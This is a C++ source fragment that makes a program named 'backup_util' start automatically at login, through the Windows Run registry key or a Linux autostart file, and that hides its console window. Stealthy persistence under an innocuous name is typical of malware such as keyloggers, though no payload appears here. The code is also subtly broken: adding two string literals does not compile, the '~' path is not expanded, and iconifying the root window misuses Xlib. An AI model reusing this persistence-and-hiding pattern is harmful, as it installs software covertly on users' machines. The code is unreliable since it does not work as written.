#ifdef __WIN32
    #include <windows.h>
#elif __linux__
    #include <X11/Xlib.h>
#endif

#include <string>
#include <filesystem>
#include <fstream>

#include "Config.h"

void set_autorun() {
    #ifdef __WIN32
        std::filesystem::path cwd = std::filesystem::current_path() / "backup_util.exe";
        std::wstring ws(cwd.string().size(), L' ');
        ws.resize(std::mbstowcs(&ws[0], cwd.string().c_str(), cwd.string().size()));
        HKEY hkey = NULL;
        LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey); //Creates a key       
        LONG status = RegSetValueEx(hkey, L"backup", 0, REG_SZ, (BYTE*)ws.c_str(), (ws.size() + 1) * sizeof(wchar_t));
    #elif __linux__
        std::ofstream autostart_file;
        autostart_file.open("~/.config/autostart/" + "backup_util" + ".desktop");
        autostart_file << "[Desktop Entry]" << std::endl;
        autostart_file << "Type=Application" << std::endl;
        autostart_file << "Exec=" << std::filesystem::current_path() / "backup_util" << std::endl;
        autostart_file << "Hidden=false" << std::endl;
        autostart_file << "NoDisplay=false" << std::endl;
        autostart_file << "X-GNOME-Autostart-enabled=true" << std::endl;
        autostart_file << "Name=" << "backup_util" << std::endl;
        autostart_file.close();
    #endif
}

void show_window(bool show) {
    #ifdef __WIN32
        ShowWindow(FindWindowA("ConsoleWindowClass", NULL), show);
    #elif __linux__
        Display* display = XOpenDisplay(nullptr);

        if (display != nullptr) {
            Window root = DefaultRootWindow(display);

            XIconifyWindow(display, root, DefaultScreen(display));
            XCloseDisplay(display);
        }
    #endif
}
